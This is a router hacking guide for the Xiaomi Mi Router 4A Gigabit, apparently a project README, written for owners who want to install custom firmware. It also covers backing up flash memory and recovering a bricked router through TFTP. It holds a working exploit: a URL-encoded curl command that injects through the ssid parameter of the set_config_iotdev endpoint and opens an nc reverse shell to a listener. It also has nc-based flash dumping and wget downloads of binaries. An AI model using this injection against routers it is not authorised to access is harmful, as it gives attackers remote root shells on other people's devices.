# Xiaomi Mi Router 4A (Gigabit Edition) — Manual Exploit & Recovery Guide
# This guide provides methods for manually obtaining a Reverse Shell, creating mandatory memory backups, and emergency firmware recovery.
[На русском](README_RU.md)


## 1. Vulnerability Exploitation (Reverse Shell)

If automated scripts (like OpenWRTInvasion) fail to open Telnet, you can try a manual command injection via the stok parameter in the web interface.

### Step 1: Prepare a Listener on your PC

Open a terminal and start a listener to "catch" the connection:
```shell
nc -lvnp 4445
```
### Step 2: Obtain the Session Token (stok)

Log in to the router's web admin panel (192.168.31.1).

Copy the token value from the browser's address bar (the string between ;stok= and the next /).

### Step 3: Execute the Command

Replace <YOUR_STOK> and <YOUR_IP> with your actual data and run this command in your terminal:
```shell
curl "http://192.168.31.1/cgi-bin/luci/;stok=<YOUR_STOK>/api/misystem/set_config_iotdev?bssid=12:34:56:78:90:AB&user_id=1234&ssid=%0Amknod%20/tmp/p%20p%3Bnc%20<YOUR_IP>%204445%200%3C/tmp/p%7C/bin/sh%201%3E/tmp/p%202%3E/tmp/p%0A"
```
2. MANDATORY: Creating a Memory Dump

Before flashing any custom firmware, you must create a full backup. If you accidentally flash a corrupted bootloader, the router will be "bricked" and can only be recovered using a hardware programmer and this dump.

To check your partitions, run: `cat /proc/mtd`.
The structure usually looks like this:
```
dev: size erasesize name

mtd0: 01000000 00010000 "ALL" (The entire 16MB flash memory)

mtd1: 00030000 00010000 "Bootloader"

mtd4: 00010000 00010000 "factory" (Contains unique Wi-Fi calibrations/EEPROM)
```
Transferring the Dump to your PC (dd + nc):

On the PC side (Receive):
```shell
nc -l -p 5555 > full_dump_r4a.bin
```
On the Router side (Send):
```shell
dd if=/dev/mtdblock0 | nc <YOUR_IP> 5555
```
Note: Using mtdblock0 ensures you have a complete copy of the entire flash memory.

3. Transferring Files to the Router

To upload custom firmware or a bootloader (like Breed) to the router:

On the PC: Start a temporary web server: `python3 -m http.server 8000`

On the Router: Download the file to the RAM:
```shell
cd /tmp
wget http://<YOUR_IP>:8000/filename.bin
```
4. Recovery (Debrick) via TFTP on Linux

If the router is bricked (system won't boot) but the bootloader (U-Boot) is still intact, use dnsmasq.

Preparation

[Download the stock firmware](https://miuirom.org/miwifi/mi-router-4a-gigabit).

Create a folder (e.g., /srv/tftp/), move the firmware there, and rename it to miwifi.bin.

Set a static IP on your PC's Ethernet interface: 192.168.31.100.

dnsmasq.conf Configuration
```shell
interface=enp9s0 # Replace with your actual interface name
bind-interfaces
dhcp-range=192.168.31.10,192.168.31.200,255.255.255.0,12h
dhcp-boot=miwifi.bin
enable-tftp
tftp-root=/srv/tftp # Path to your firmware folder
tftp-unique-root
```
Recovery Process

Monitoring: Run `sudo tcpdump -i enp9s0 -lnnv` to monitor the router's activity.

Triggering: Hold the Reset button on the powered-off router, then plug in the power cable.

As soon as you see U-Boot logs in tcpdump, immediately start the server:

`sudo dnsmasq -C dnsmasq.conf -d`

Status:

If dnsmasq logs show sent, the router is accepting the file.

Solid Orange Light: The router is flashing itself. Wait patiently.

Blinking Red Light: Failure (wrong firmware region or timeout).
